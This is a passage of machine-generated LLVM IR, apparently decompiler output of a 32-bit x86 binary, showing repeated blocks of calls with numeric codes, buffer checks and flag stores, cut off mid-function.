  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_804f660()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_804f660()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049044, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
